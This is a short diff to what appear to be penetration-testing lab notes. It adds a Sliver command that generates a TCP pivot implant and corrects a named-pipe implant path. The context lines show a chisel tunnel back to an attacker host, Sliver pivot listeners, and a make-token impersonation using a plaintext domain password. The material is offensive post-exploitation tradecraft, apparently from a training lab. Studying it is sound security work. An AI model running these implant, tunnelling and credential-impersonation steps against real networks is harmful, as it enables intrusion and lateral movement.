@@ -130,11 +130,12 @@ chisel client --max-retry-count 2 10.10.15.165:2345 8444:10.10.15.165:4444 8080:
 ### Open 172.16.1.11:9898 for sliver
 ifconfig
 pivots tcp --bind 172.16.1.11
+generate --tcp-pivot 172.16.1.11:9898 --skip-symbols -N pivot-beacon
 
 # name pipe
 pivots named-pipe --bind Etaks
 ## implant
-generate --named-pipe 172.16.1.11/pipe/academy -N pipe_Etaks 
+generate --named-pipe 172.16.1.11/pipe/Etaks -N pipe_Etaks 
 
 # token
 make-token -u svc_sql -d child.my.local -p Pass123
